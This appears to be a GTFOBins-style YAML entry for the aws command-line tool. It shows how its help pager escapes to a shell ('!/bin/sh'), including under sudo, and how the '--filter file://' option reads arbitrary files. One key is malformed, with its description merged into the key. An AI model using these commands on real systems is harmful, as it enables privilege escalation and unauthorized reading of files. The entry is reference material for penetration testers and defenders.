---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        aws help
        !/bin/sh
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo aws help
        !/bin/sh
  file-read:The filter parameter is used to indicate a file with the filter in a specific format, when the file read does not follow the format the engine that parses the file prints its content on the terminal, this behavior affects most of the aws actions with filter parameter
      code: |
        LFILE=file_to_read
        aws ec2 describe-instances --filter file://$LFILE
---
